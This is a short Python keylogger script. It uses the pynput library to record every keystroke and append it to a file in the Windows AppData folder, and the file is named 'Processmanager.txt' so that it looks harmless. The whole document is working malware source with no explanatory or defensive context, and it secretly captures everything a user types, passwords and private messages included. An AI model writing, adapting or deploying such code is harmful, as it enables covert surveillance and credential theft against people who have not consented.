import os
from pynput.keyboard import Listener


keys = []
count = 0
path = os.environ['appdata'] + '\\Processmanager.txt'
# path = 'processmanager.txt'

# create on press function


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(path, 'a') as f:
        # open file for appending and not writing
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('backspace') > 0:
                f.write(' Backspace ')
            elif k.find('enter') > 0:
                f.write('\n')
            elif k.find('shift') > 0:
                f.write(' shift ')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('caps lock') > 0:
                f.write(' caps_lock ')
            elif k.find('key'):
                f.write(k)


with Listener(on_press=on_press) as listener:
    listener.join()
